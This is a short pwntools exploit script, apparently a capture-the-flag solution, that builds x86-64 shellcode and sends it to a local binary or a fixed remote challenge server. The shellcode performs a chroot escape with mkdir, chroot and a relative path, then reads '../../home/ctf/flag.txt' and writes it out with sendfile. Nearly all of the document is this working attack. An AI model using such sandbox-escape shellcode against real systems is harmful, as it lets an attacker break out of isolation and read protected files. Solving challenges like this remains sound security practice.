from pwn import *
import subprocess
from time import sleep


############## setup ###############
context.arch = "amd64"
exe = ELF("./main")
libc = exe.libc
host, port = "185.91.127.50", 12002 
if args.REMOTE:
    p = remote(host,port)
elif args.GDB:
    p = gdb.debug([exe.path])
else:
    p = process([exe.path])
#####################################

elf_code = '''
.section .text
.globl _start
_start:
    .intel_syntax noprefix
    mov rax, 0x53
    lea rdi, [rip + newdir]
    mov rsi, 755
    syscall

    mov rax, 0xA1
    lea rdi, [rip + newdir]
    syscall

    mov rax, 2
    lea rdi, [rip + flag]
    mov rsi, 0
    mov rdx, 755
    syscall

    mov rsi, rax
    mov rax, 0x28
    mov rdi, 1
    mov rdx, 0
    mov r10, 0x50
    syscall
newdir: 
    .asciz "/newroot"
flag:
    .asciz "../../home/ctf/flag.txt"

'''
open("./shell.s", "w").write(elf_code)

subprocess.run(["gcc", "-static", "-nostdlib", "shell.s", "-o", "shell"], check=True)
subprocess.run(["objcopy", "--dump-section", ".text=shellcode", "shell"], check=True)

shellcode = open("./shellcode", "rb").read()

p.send(shellcode)

p.interactive()
